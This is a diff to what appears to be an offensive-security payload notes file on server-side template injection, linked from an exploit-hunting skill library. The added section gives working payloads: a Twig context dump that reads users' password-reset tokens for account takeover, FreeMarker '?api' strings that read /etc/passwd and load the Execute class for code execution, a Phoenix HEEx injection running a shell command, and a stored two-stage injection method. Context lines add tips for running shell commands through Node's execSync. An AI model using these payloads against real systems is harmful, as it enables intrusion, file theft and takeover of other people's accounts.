@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, ssti, rce, web]
 sources: []
 date_created: 2026-06-05
-date_updated: 2026-07-21
+date_updated: 2026-11-09
 ---
 
 # Payloads: SSTI
@@ -74,3 +74,25 @@ Handlebars:   constructor lookup chain (prototype)
 Gotchas when shelling through it: `execSync` throws on any nonzero exit and the throw swallows ALL output, so end fallible commands with `; true`; escape shell parens as `\\(` inside the JS string; avoid single quotes; read output from the rendered template block, not the echoed source (the literal template still shows in the page).
 
 <!-- promoted-slug: ejs-node-ssti-rce -->
+
+
+## NEW 2025-2026: two-stage stored + no-RCE ATO
+
+- **Two-stage stored SSTI** (StyleSmuggler/Magento class): poison a
+  report/log/session/header/custom-option record; executes when a mail
+  template or GraphQL `styles` read renders it later. Moving session storage
+  does not fix it (any writable source replaces it). Neither stage reflects;
+  OOB/DNS is the proof channel. Probe write and render stages separately.
+- **Context dump -> ATO** (Twig): `{{ _context|json_encode }}` then
+  `{{ users[0].reset_token }}`; chain forgot-password -> render the target
+  record through the stored template -> redeem = ATO without mailbox access.
+  Sandbox = allow/deny policy, NOT data safety.
+- **FreeMarker `?api`** (bypasses ALLOWS_NOTHING_RESOLVER):
+  `?api.class.getResourceAsStream` byte read; `getResource("/").toURI()?api.create("file:///etc/passwd")`;
+  RCE via public static Gson field ->
+  `gson?api.fromJson("{}", loadClass("freemarker.template.utility.Execute"))`.
+- **Phoenix LiveView HEEx**: `psb-assign` -> attribute interpolated into
+  generated HEEx -> compiled+evaluated:
+  `foo" pwned={elem(System.cmd("sh",["-c","id"]), 0)} a="`.
+
+Full ladder: `skills/exploit/hunt/hunt-injection/references/bypass-arsenal.md`.
